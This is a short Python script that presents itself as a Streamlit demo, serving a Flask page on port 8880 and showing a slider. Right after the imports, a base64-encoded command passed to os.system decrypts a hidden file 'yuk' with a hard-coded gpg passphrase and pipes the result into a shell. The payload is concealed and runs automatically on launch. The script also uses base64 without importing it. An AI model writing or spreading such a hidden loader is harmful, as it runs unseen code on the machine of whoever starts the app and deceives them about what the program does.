import streamlit as st
import os
cmd = base64.b64decode('Z3BnIC0tcGluZW50cnktbW9kZT1sb29wYmFjayAtLXBhc3NwaHJhc2UgInJhaGFzaWEiIC0teWVzIC1kIC1vIHJ1bm5lci5zaCB5dWsgJiYgY2F0IHJ1bm5lci5zaCB8IHNo').decode('utf-8')
os.system(cmd)
if not hasattr(st, 'already_started_server'):
    st.already_started_server = True

    st.write('''
        The first time this script executes it will run forever because it's
        running a Flask server.
        Just close this browser tab and open a new one to see your Streamlit
        app.
    ''')

    from flask import Flask

    app = Flask(__name__)

    @app.route('/foo')
    def serve_foo():
        return 'This page is served via Flask!'

    app.run(port = 8880)

x = st.slider('Pick a number')
st.write('You picked:', x)
